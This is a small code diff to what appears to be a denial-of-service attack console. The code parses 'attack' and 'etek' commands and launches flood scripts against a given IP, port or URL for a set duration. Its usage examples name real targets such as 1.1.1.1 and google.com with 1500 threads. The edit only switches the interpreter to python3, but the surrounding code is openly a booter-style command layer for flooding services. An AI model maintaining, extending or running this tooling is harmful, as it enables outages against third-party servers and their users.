@@ -333,7 +333,7 @@ def main():
                 port = cnc.split()[2]
                 time = cnc.split()[3]
                 methods = cnc.split()[4]
-                os.system(f'python papaw.py {ip} {port} {time} JOKER')
+                os.system(f'python3 papaw.py {ip} {port} {time} JOKER')
             except IndexError:
                 print('Usage: attack <ip> <port> <time> <methods>')
                 print('Example: attack 1.1.1.1 80 60 joker')
@@ -344,7 +344,7 @@ def main():
                 threads = cnc.split()[2]
                 time = cnc.split()[3]
                 methods = cnc.split()[4]
-                os.system(f'python url.py {url} {threads} {time} LIGHTNING')
+                os.system(f'python3 url.py {url} {threads} {time} LIGHTNING')
             except IndexError:
                 print('Usage: etek <url> <threads> <time> <method>')
                 print('Example: etek https://google.com/ 1500 60 lightning')
